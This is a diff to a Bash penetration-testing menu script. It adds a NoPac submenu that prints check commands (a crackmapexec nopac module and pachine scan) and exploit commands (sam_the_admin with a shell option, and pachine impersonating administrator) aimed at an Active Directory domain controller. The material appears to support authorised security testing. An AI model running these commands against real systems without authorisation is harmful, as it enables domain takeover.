@@ -1971,13 +1971,13 @@ echo -ne " What would you like to do?
 	7)  ->	[ MSSQL		]
 	8)  ->	[ NTP		]
 	9)  ->	[ Nmap		]
-	10)  ->	[ Pywerview	]
+	10) ->	[ Pywerview	]
 	11) -> 	[ RDP		]
 	12) ->	[ SMB		]
 	13) ->	[ WinRM		]
 	
 	Q)  -> 	[ Options	]
-        
+        E)  -> 	[ Recent CVE's	]
 "
         read a
         case $a in
@@ -1995,6 +1995,7 @@ echo -ne " What would you like to do?
                 12)	External_Menu_SMB ;;
                 13)	External_Menu_WinRM ;;
                 q|Q)	External_Menu_Options ;;
+                e|E)	External_Menu_CVEs ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -2606,6 +2607,124 @@ echo -ne  "Return to Previous Menu?
         
 }
 
+External_Menu_CVEs(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Recent CVE's${RESTORE}"
+
+echo -ne " What would you like to do?
+
+
+	1)  ->  [ NoPac ${LYELLOW}WIP${RESTORE}	]
+	
+	Q)  ->	[Previous Menu	]
+
+"
+        read a
+        case $a in
+                1) 	External_Menu_CVEs_NoPac ;;
+                q|Q)	External_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+}
+
+External_Menu_CVEs_NoPac(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}NoPac Menu${RESTORE}"
+
+echo -ne " What would you like to do?
+
+
+	1)  ->  [ Check    	]
+	2)  ->	[ Exploit  	]
+	
+	Q)  ->	[Previous Menu	]
+
+"
+        read a
+        case $a in
+                1) 	External_Menu_CVEs_NoPac_Check ;;
+                2)	External_Menu_CVEs_NoPac_Exploit ;;
+                q|Q) 	External_Menu_CVEs ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
+}
+
+External_Menu_CVEs_NoPac_Check(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}NoPac Checks${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Crackmapexec${RESTORE}"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}nopac${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Pachine${RESTORE}"
+echo -e "python3 pachine.py -dc-host $NQIP -scan $NQDomain/$NQUsername:$Password"
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_CVEs_NoPac ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+}
+
+External_Menu_CVEs_NoPac_Exploit(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}NoPac Exploits (Auto)${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}sam-the-admin${RESTORE}"
+echo -e "python3 sam_the_admin.py $NQDomain/$NQUsername:$Password -dc-ip $IP -shell"
+echo -e ""
+echo -e "${IBLUE}Pachine${RESTORE}"
+echo -e "python3 pachine.py -dc-host $NQIP -spn cifs/$NQIP -impersonate administrator $NQDomain/$NQUsername:$Password"
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_CVEs_NoPac ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+}
+
 External_Variables_Required(){
 
 	clear
@@ -2785,3 +2904,4 @@ echo -ne "
 
 # Call the menu function
 Main_Menu
+
